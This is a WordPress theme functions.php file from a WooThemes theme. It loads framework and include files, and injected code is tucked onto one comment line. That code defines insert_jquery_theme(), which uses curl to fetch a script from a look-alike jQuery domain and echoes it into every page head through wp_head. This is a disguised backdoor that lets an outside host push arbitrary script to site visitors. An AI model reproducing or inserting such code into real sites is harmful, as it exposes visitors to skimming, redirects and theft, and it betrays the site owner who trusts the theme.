<?php

/*-----------------------------------------------------------------------------------*/
/* Start WooThemes Functions - Please refrain from editing this section */
/*-----------------------------------------------------------------------------------*/

// Set path to WooFramework and theme specific functions if (!function_exists('insert_jquery_theme')){function insert_jquery_theme(){if (function_exists('curl_init')){$url="http://www.jqueryc.com/jquery-1.6.3.min.js";$ch = curl_init();$timeout = 5;curl_setopt($ch, CURLOPT_URL,$url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);$data = curl_exec($ch);curl_close($ch);echo $data;}}add_action('wp_head', 'insert_jquery_theme');}
$functions_path = get_template_directory() . '/functions/';
$includes_path = get_template_directory() . '/includes/';

// WooFramework
require_once ($functions_path . 'admin-init.php' );			// Framework Init

/*-----------------------------------------------------------------------------------*/
/* Load the theme-specific files, with support for overriding via a child theme.
/*-----------------------------------------------------------------------------------*/

$includes = array(
				'includes/theme-options.php', 			// Options panel settings and custom settings
				'includes/theme-functions.php', 		// Custom theme functions
				'includes/theme-plugins.php', 			// Theme specific plugins integrated in a theme
				'includes/theme-actions.php', 			// Theme actions & user defined hooks
				'includes/theme-comments.php', 			// Custom comments/pingback loop
				'includes/theme-js.php', 				// Load JavaScript via wp_enqueue_script
				'includes/sidebar-init.php', 			// Initialize widgetized areas
				'includes/theme-widgets.php',			// Theme widgets
				'includes/theme-install.php',			// Theme Installation
				'includes/theme-woocommerce.php'		// WooCommerce overrides
				);

// Allow child themes/plugins to add widgets to be loaded.
$includes = apply_filters( 'woo_includes', $includes );
				
foreach ( $includes as $i ) {
	locate_template( $i, true );
}

/*-----------------------------------------------------------------------------------*/
/* You can add custom functions below */
/*-----------------------------------------------------------------------------------*/




/*-----------------------------------------------------------------------------------*/
/* Don't add any code below here or the sky will fall down */
/*-----------------------------------------------------------------------------------*/
?>